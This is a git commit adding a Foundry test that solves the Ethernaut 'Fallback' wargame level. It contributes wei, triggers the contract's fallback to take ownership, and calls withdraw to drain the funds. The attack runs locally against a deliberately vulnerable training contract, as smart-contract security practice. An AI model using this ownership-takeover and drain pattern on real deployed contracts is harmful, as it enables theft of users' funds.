8f7d358ee1eb0624765aea54d2f298188c16e55f
gtmendler <g.t.mendler@gmail.com>
2024-02-15 12:03:54 +0100

    added ethernaut solution 01 Fallback

---
+++ test/01-Fallback..t.sol
@@ -0,0 +1,49 @@
+pragma solidity ^0.8.10;
+
+//import "ds-test/test.sol";
+import "forge-std/Vm.sol";
+import "forge-std/Test.sol";
+
+import "../src/01-Fallback/FallbackFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract FallbackTest is Test {
+    Ethernaut ethernaut;
+    address eoaAddress = address(1337);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+        vm.deal(eoaAddress, 1 ether);
+    }
+
+    function testFallbackHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        FallbackFactory fallbackFactory = new FallbackFactory();
+        ethernaut.registerLevel(fallbackFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
+        Fallback ethernautFallback = Fallback(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        
+        ethernautFallback.contribute{value: 1}();
+        (bool success,) = address(ethernautFallback).call{value: 1}("");
+        console.log(success);
+        ethernautFallback.withdraw();
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
